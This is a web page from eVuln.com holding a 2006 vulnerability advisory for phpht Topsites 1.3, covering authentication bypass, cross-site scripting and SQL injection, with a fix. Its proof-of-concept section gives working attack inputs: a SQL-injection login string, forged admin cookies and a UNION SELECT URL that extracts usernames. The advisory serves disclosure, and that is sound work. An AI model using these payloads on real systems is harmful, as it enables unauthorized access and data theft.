=== Content from evuln.com_60657a2c_20250125_172901.html ===
  [![Website Security](http://evuln.com/img/logo.gif)](http://evuln.com/)  [Signup](http://evuln.com/account/signup) [Login](http://evuln.com/account/login)

* [Home](http://evuln.com/)
* [Services](http://evuln.com)
  + [Malware & Hack Repair](http://evuln.com/services/hack-repair/)
  + [Hack Insurance](http://evuln.com/services/hack-insurance/)
  + [External Monitoring](http://evuln.com/services/external-monitoring/)
* [Pricing](http://evuln.com/pricing/)
* [eVuln Labs](http://evuln.com)
  + [Scanner Statistics](http://evuln.com/labs/stats/)
  + [eVuln Advisories](http://evuln.com/labs/advisories/)
  + [Fixing Guide](http://evuln.com/labs/fixing-guide/)
* [Free Tools](http://evuln.com)
  + [Malware Scanner](http://evuln.com/tools/malware-scanner/)
  + [PHP Code Scanner](http://evuln.com/tools/php-security/)
  + [HTTP packet generator](http://evuln.com/tools/http-generator/)
  + [XSS string encoder](http://evuln.com/tools/xss-encoder/)
  + [SQL string encoder](http://evuln.com/tools/sql-encoder/)
* [Contacts](http://evuln.com/contacts/)

# Multiple Vulnerabilities in phpht Topsites

## Summary

VulnerabilityMultiple Vulnerabilities in phpht TopsitesDiscovered2006.02.04Last Update2006.03.18 Solution addedIDEV0059CVECVE-2006-0653 CVE-2006-0654 CVE-2006-0655Risk LevelmediumTypeMultiple VulnerabilitiesStatusPatchedVendor Hinton Design (http://www.hintondesign.org)Vulnerable Software phpht Topsites (http://www.hintondesign.org/downloads/view\_cat.php?cat\_id=76)Version1.3PoC/ExploitAvailableSolutionAvailableDiscovered byAliaksandr Hartsuyeu (eVuln.com)
## Description

Multiple Vulnerabilities found in phpht Topsites (http://www.hintondesign.org/downloads/view\_cat.php?cat\_id=76) script.

1. Authentication Bypass
Vulnerable script: check.php

There are two ways to bypass authentication:

a) SQL Injection
Variable $HTTP\_POST\_VARS[username] isn't properly sanitized before being used in a SQL query. This can be used to make any SQL query by injecting arbitrary SQL code.
Condition: magic\_quotes\_gpc - off

b) Cookie based authentication
check.php script dont make password comparisson when identifying user by cookies

2. Multiple Cross-Site Scripting
Vulnerable scripts: link\_edited.php link\_added.php
Most of user-defined data isn't properly sanitized. This can be used to post arbitrary html or script code.

3. Multiple SQL Injections
Vulnerable scripts: all scripts showing some data from database
Most of user-defined data isn't properly sanitized. This can be used to make any SQL query by injecting arbitrary SQL code.
Condition: magic\_quotes\_gpc - off

## PoC/Exploit

1. Authentication Bypass

a) SQL Injection
url: http://host/ht/admin.php
Username: ' or 1/\*
Password: any

b) Cookie based authentication
Cookie: loged=yes
Cookie: username=admin
Cookie: user\_level=1
Cookie: userid=1

2. Cross-Site Scripting Example.
Url:
http://host/phpht/add\_link.php
or
http://host/phpht/edit\_link.php

Website: <XSS>
Website description: <XSS>

3. SQL Injection Example:
http://host/phpht/link.php?id=99'%20union%20select%201,username,3,4,5,6,7,8,9,10,11 from phpht\_users/\*

## Solution.

To fix this problem install or upgrade to latest version provided by vendor.

### Company

* PC Evuln.com / II Evuln.com
* Email:
* skype: evuln.com
* Phone: +37068935936

### Services

* [Hack Repair](http://evuln.com/services/hack-repair/)
* [Hack Insurance](http://evuln.com/services/hack-insurance/)
* [External Monitoring](http://evuln.com/services/external-monitoring/)
* [Pricing](http://evuln.com/pricing/)
* [Partner Program](http://evuln.com/partners/)

### eVuln Labs

* [Scanner Statistics](http://evuln.com/labs/stats/)
* [eVuln Advisories](http://evuln.com/labs/advisories/)
* [Fixing Guide](http://evuln.com/labs/fixing-guide/)

### eVuln Tools

* [Malware Scanner](http://evuln.com/tools/malware-scanner/)
* [PHP Code Scanner](http://evuln.com/tools/php-security/)
* [HTTP Packet Generator](http://evuln.com/tools/http-generator/)
* [XSS String Encoder](http://evuln.com/tools/xss-encoder/)
* [SQL String Encoder](http://evuln.com/tools/sql-encoder/)

[Privacy Policy](http://evuln.com/privacy.html) | [Terms of Use](http://evuln.com/terms.html) | Copyright 2005-2014 eVuln.com


